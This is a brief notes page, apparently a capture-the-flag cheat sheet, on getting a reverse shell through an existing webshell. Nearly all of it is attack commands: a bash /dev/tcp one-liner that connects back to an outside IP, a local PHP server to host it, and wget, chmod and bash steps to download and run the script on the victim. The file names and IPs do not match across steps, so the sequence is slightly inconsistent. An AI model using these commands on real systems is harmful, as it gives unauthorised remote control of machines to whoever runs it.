# Reverse Shells  


## Reverse Shell Not Working & You Have a WebShell  

* We can do the following to, maybe, get that working   

  <blockquote>
  Getting a reverse shell using the above command didn't work. Let's create a reverse shell, start an
  HTTP server locally and download it to the remote machine
  </blockquote>

  * Like this code --> `echo "0<&196;exec 196<>/dev/tcp/10.10.14.3/5555; sh <&196 >&196 2>&196" > shell
php -S 0.0.0.0:8000`.    

* Then from the webshell I enter the following   
  ```
  wget http://10.10.14.8:8000/revshell.sh -O /tmp/revshell.sh
  chmod +x /tmp/shell
  bash /tmp/shell
  ```


## Reverse Shells 